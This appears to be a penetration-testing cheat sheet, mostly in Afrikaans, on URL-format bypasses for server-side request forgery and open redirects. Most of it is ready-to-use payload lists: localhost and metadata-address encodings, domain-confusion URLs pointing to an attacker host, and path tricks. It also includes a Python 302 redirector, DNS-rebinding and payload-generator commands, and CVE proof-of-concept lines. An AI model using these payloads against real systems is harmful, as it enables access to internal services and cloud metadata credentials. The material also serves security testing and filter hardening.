# URL Format Bypass

{{#include ../../banners/hacktricks-training.md}}

### Localhost

<details>
<summary>Localhost payloads</summary>
```bash
# Localhost
0 # Yes, just 0 is localhost in Linux
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1:80
http://127.000000000000000.1
http://0
http:@0/ --> http://localhost/
http://0.0.0.0:80
http://localhost:80
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:3128/ Squid
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
http://①②⑦.⓪.⓪.⓪

# CIDR bypass
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0

# Dot bypass
127。0。0。1
127%E3%80%820%E3%80%820%E3%80%821

# Decimal bypass
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1

# Octal Bypass
http://0177.0000.0000.0001
http://00000177.00000000.00000000.00000001
http://017700000001

# Hexadecimal bypass
127.0.0.1 = 0x7f 00 00 01
http://0x7f000001/ = http://127.0.0.1
http://0xc0a80014/ = http://192.168.0.20
0x7f.0x00.0x00.0x01
0x0000007f.0x00000000.0x00000000.0x00000001

# Mixed encodings bypass
169.254.43518 -> Partial Decimal (Class B) format combines the third and fourth parts of the IP address into a decimal number
0xA9.254.0251.0376 -> hexadecimal, decimal and octal

# Add 0s bypass
127.000000000000.1

# You can also mix different encoding formats
# https://www.silisoftware.com/tools/ipconverter.php

# Malformed and rare
localhost:+11211aaa
localhost:00011211aaaa
http://0/
http://127.1
http://127.0.1

# DNS to localhost
localtest.me = 127.0.0.1
customer1.app.localhost.my.company.127.0.0.1.nip.io = 127.0.0.1
mail.ebc.apple.com = 127.0.0.6 (localhost)
127.0.0.1.nip.io = 127.0.0.1 (Resolves to the given IP)
www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resolves to www.google.com
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://bugbounty.dod.network = 127.0.0.2 (localhost)
1ynrnhl.xip.io == 169.254.169.254
spoofed.burpcollaborator.net = 127.0.0.1
```
</details>

![](<../../images/image (776).png>)

Die **Burp extension** [**Burp-Encode-IP**](https://github.com/e1abrador/Burp-Encode-IP) implementeer omseilings vir IP-formatering.

### Domein-ontleder

<details>
<summary>Domein-ontleder omseilings</summary>
```bash
https:attacker.com
https:/attacker.com
http:/\/\attacker.com
https:/\attacker.com
//attacker.com
\\/\/attacker.com/
/\/attacker.com/
/attacker.com
%0D%0A/attacker.com
#attacker.com
#%20@attacker.com
@attacker.com
http://169.254.1698.254\@attacker.com
attacker%00.com
attacker%E3%80%82com
attacker。com
ⒶⓉⓉⒶⒸⓀⒺⓡ.Ⓒⓞⓜ
# double encoded fragment to bypass split("#"): attacker.com%2523@victim
```
</details>
```
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾
⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗
⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰
⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ
Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ
ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```
### Domeinverwarring

<details>
<summary>Domeinverwarring payloads</summary>
```bash
# Try also to change attacker.com for 127.0.0.1 to try to access localhost
# Try replacing https by http
# Try URL-encoded characters
https://{domain}@attacker.com
https://{domain}.attacker.com
https://{domain}%6D@attacker.com
https://attacker.com/{domain}
https://attacker.com/?d={domain}
https://attacker.com#{domain}
https://attacker.com@{domain}
https://attacker.com#@{domain}
https://attacker.com%23@{domain}
https://attacker.com%00{domain}
https://attacker.com%0A{domain}
https://attacker.com?{domain}
https://attacker.com///{domain}
https://attacker.com\{domain}/
https://attacker.com;https://{domain}
https://attacker.com\{domain}/
https://attacker.com\.{domain}
https://attacker.com/.{domain}
https://attacker.com\@@{domain}
https://attacker.com:\@@{domain}
https://attacker.com#\@{domain}
https://attacker.com\anything@{domain}/
https://www.victim.com(\u2044)some(\u2044)path(\u2044)(\u0294)some=param(\uff03)hash@attacker.com
# colon + backslash confusion (CVE-2025-0454 in autogpt)
http://localhost:\@google.com/../

# On each IP position try to put 1 attackers domain and the others the victim domain
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/

# Parameter pollution
next={domain}&next=attacker.com
```
</details>

### Paaie en Uitbreidings Bypass

As daar vereis word dat die URL in 'n pad of 'n uitbreiding moet eindig, of 'n pad moet bevat, kan jy een van die volgende bypasses probeer:
```
https://metadata/vulnerable/path#/expected/path
https://metadata/vulnerable/path#.extension
https://metadata/expected/path/..%2f..%2f/vulnerable/path
```
### Fuzzing

Die hulpmiddel [**recollapse**](https://github.com/0xacb/recollapse) kan variasies uit 'n gegewe invoer genereer om die gebruikte regex te omseil. Kyk ook na [**this post**](https://0xacb.com/2022/11/21/recollapse/) vir meer inligting.

### Automatic Custom Wordlists

Kyk na die [**URL validation bypass cheat sheet** webapp](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet) van portswigger, waar jy die toegelate host en die aanvaller se een kan invoer en dit 'n lys van URL's vir jou sal genereer om te probeer. Dit oorweeg ook of jy die URL in 'n parameter, in 'n Host header of in 'n CORS header kan gebruik.


{{#ref}}
https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
{{#endref}}

### Bypass via redirect

Dit is moontlik dat die bediener die **oorspronklike versoek** van 'n SSRF **filtreer, maar nie** 'n moontlike **redirect**-antwoord daarop nie.\
Byvoorbeeld, 'n bediener wat kwesbaar is vir SSRF via: `url=https://www.google.com/` mag die **url-param** filtreer. Maar as jy 'n [python server to respond with a 302](https://pastebin.com/raw/ywAUhFrv) gebruik om te antwoord op die plek waar jy wil omlei, mag jy in staat wees om **toegang tot gefiltreerde IP-adresse** soos 127.0.0.1 te kry of selfs gefiltreerde **protokolle** soos gopher.\
[Check out this report.](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530)

<details>
<summary>Eenvoudige redirector vir SSRF-toetsing</summary>
```python
#!/usr/bin/env python3

#python3 ./redirector.py 8000 http://127.0.0.1/

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
print("Usage: {} <port_number> <url>".format(sys.argv[0]))
sys.exit()

class Redirect(BaseHTTPRequestHandler):
def do_GET(self):
self.send_response(302)
self.send_header('Location', sys.argv[2])
self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```
</details>

### DNS rebinding bypass (2025+)

Selfs wanneer 'n SSRF-filter 'n **enkele DNS-oplossing voordat die HTTP-versoek gestuur word** uitvoer, kan jy steeds interne hosts bereik deur die domein te herbind tussen opsoek en verbinding:

1. Wys `victim.example.com` na 'n openbare IP sodat dit die allow‑list / CIDR check slaag.
2. Bedien 'n baie lae TTL (of gebruik 'n gesaghebbende server wat jy beheer) en herbind die domein na `127.0.0.1` of `169.254.169.254` net voor die werklike versoek gemaak word.
3. Tools soos **Singularity** (`nccgroup/singularity`) outomatiseer die gesaghebbende DNS + HTTP server en sluit kant‑klaar payloads in. Voorbeeld opstart: `python3 singularity.py --lhost <your_ip> --rhost 127.0.0.1 --domain rebinder.test --http-port 8080`.

Hierdie tegniek is in 2025 gebruik om die BentoML "safe URL" patch en soortgelyke single‑resolve SSRF filters te omseil.

### Verduidelikte Truuks

#### Backslash-trick

Die _backslash-trick_ misbruik 'n verskil tussen die [WHATWG URL Standard](https://url.spec.whatwg.org/#url-parsing) en [RFC3986](https://datatracker.ietf.org/doc/html/rfc3986#appendix-B). Terwyl RFC3986 'n algemene raamwerk vir URIs is, is WHATWG spesifiek vir web URLs en word dit deur moderne browswers aangeneem. Die sleutelonderskeid lê in die WHATWG-standaard se erkenning van die backslash (`\`) as ekwivalent aan die forward slash (`/`), wat beïnvloed hoe URL's gepars word en spesifiek die oorgang van hostname na pad in 'n URL merk.

![https://bugs.xdavidhu.me/assets/posts/2021-12-30-fixing-the-unfixable-story-of-a-google-cloud-ssrf/spec_difference.jpg](https://bugs.xdavidhu.me/assets/posts/2021-12-30-fixing-the-unfixable-story-of-a-google-cloud-ssrf/spec_difference.jpg)

#### Linker vierkantige hakie

Die “left square bracket” karakter `[` in die userinfo-segment kan veroorsaak dat Spring’s UriComponentsBuilder 'n hostname-waarde teruggee wat van browswers verskil: [https://example.com\[@attacker.com](https://portswigger.net/url-cheat-sheet#id=1da2f627d702248b9e61cc23912d2c729e52f878)

#### Ander Verwarrings

![https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/](<../../images/image (600).png>)

beeld van [https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/](https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/)

#### IPv6 Zone Identifier (%25) Trick

Moderne URL-parsers wat RFC 6874 ondersteun laat *link-local* IPv6-adresse toe om 'n **zone identifier** na 'n persentteken te bevat. Sommige sekuriteitsfilters is nie bewus van hierdie sintaksis nie en sal slegs vierkant‑hakie‑afgegrensde IPv6-literals verwyder, wat die volgende payload na 'n interne koppelvlak laat deurkom:
```text
http://[fe80::1%25eth0]/          # %25 = encoded '%', interpreted as fe80::1%eth0
http://[fe80::a9ff:fe00:1%25en0]/ # Another example (macOS style)
```
As die teiken‑toepassing valideer dat die host *nie* `fe80::1` is nie maar by die `%` ophou met ontleding, kan dit die versoek verkeerdelik as ekstern beskou. Normaliseer altyd die adres **voor** enige sekuriteitsbesluit of verwyder die opsionele sone‑id heeltemal.

### Onlangse biblioteek-ontledings CVEs (2022–2026)

A number of mainstream frameworks have suffered from hostname-mismatch issues that can be exploited for SSRF once URL validation has been bypassed with the tricks listed above:

| Jaar | CVE | Komponent | Foutopsomming | Minimale PoC |
|------|-----|-----------|---------------|--------------|
| 2025 | CVE-2025-0454 | Python `requests` + `urllib.parse` (autogpt) | Ontledingsongesteldheid op `http://localhost:\\@google.com/../` laat allow‑lists dink host is `google.com`, terwyl die versoek by `localhost` uitkom. | `requests.get("http://localhost:\\@google.com/../")` |
| 2025 | CVE-2025-2691 | Node package `nossrf` | Biblioteek wat bedoel is om SSRF te blokkeer kontroleer slegs die oorspronklike hostname, nie die **resolved IP** nie, wat hostnames toelaat wat na private reekse oplos. | `curl "http://trusted.example" --resolve trusted.example:80:127.0.0.1` |
| 2024 | CVE-2024-29415 | Node `ip` package | `isPublic()` het dotted‑octal / short‑form localhost (bv. `0127.0.0.1`, `127.1`) verkeerd geklassifiseer as public, wat filters toelaat interne teikens te aanvaar. | `ip.isPublic('0127.0.0.1')` returns true on vulnerable versions |
| 2024 | CVE-2024-3095 | Langchain WebResearchRetriever | Geen host‑filtering nie; GET versoeke kon IMDS/localhost van AI‑agente bereik. | User‑controlled URL inside `WebResearchRetriever` |
| 2024 | CVE-2024-22243 / ‑22262 | Spring `UriComponentsBuilder` | '`[`' in userinfo word anders ontleed deur Spring vs browsers, wat allow‑list omseiling toelaat. | `https://example.com\[@internal` |
| 2023 | CVE-2023-27592 | **urllib3** <1.26.15 | Backslash‑verwarring het toegelaat dat `http://example.com\\@169.254.169.254/` hostfilters omseil wat op `@` split. | — |
| 2022 | CVE-2022-3602 | OpenSSL | Hostname‑verifikasie is oorgeslaan wanneer die naam met 'n `.` afgesluit is (dotless domain confusion). | — |

### Payload-generation helpers (2024+)

Om groot, pasgemaakte woordlyste met die hand te skep is moeisaam. Die open-source tool **SSRF-PayloadMaker** (Python 3) kan nou outomaties *80 k+* host-mangling combinations genereer, insluitend mixed encodings, forced-HTTP downgrade en backslash variants:
```bash
# Generate every known bypass that transforms the allowed host example.com to attacker.com
python3 ssrf_maker.py --allowed example.com --attacker attacker.com -A -o payloads.txt
```
Die resulterende lys kan direk ingevoer word in Burp Intruder of `ffuf`.

## Verwysings

- [https://as745591.medium.com/albussec-penetration-list-08-server-side-request-forgery-ssrf-sample-90267f095d25](https://as745591.medium.com/albussec-penetration-list-08-server-side-request-forgery-ssrf-sample-90267f095d25)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md)
- [https://portswigger.net/research/new-crazy-payloads-in-the-url-validation-bypass-cheat-sheet](https://portswigger.net/research/new-crazy-payloads-in-the-url-validation-bypass-cheat-sheet)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-22243](https://nvd.nist.gov/vuln/detail/CVE-2024-22243)
- [https://github.com/hsynuzm/SSRF-PayloadMaker](https://github.com/hsynuzm/SSRF-PayloadMaker)
- [https://medium.com/%40narendarlb123/1-cve-2025-0454-autogpt-ssrf-via-url-parsing-confusion-921d66fafcbe](https://medium.com/%40narendarlb123/1-cve-2025-0454-autogpt-ssrf-via-url-parsing-confusion-921d66fafcbe)
- [https://www.tenable.com/blog/how-tenable-bypassed-patch-for-bentoml-ssrf-vulnerability-CVE-2025-54381](https://www.tenable.com/blog/how-tenable-bypassed-patch-for-bentoml-ssrf-vulnerability-CVE-2025-54381)

{{#include ../../banners/hacktricks-training.md}}
